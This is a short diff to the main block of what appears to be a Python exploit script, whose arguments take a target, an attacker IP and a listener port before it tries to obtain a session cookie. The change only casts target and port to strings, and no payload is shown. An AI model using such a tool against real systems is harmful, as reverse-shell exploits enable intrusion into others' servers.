@@ -77,11 +77,11 @@ if __name__ == '__main__':
 	parser.add_argument('-a','--attacker', help='attacker_ip, required=True')
 	parser.add_argument('-l','--listener', help='attacker port listening, required=True')
 	args = parser.parse_args()
-	full_target = args.target + ":" + args.port
+	full_target = str(args.target) + ":" + str(args.port)
 	attacker_ip = args.attacker
 	attacker_port = args.listener
 	args = parser.parse_args()
-	full_target = args.target + ":" + args.port
+	full_target = str(args.target) + ":" + str(args.port)
 	print("[+] Attempting to obtain the cookie value")
 	session=get_cookie(full_target)
 	if len(session) == 0:
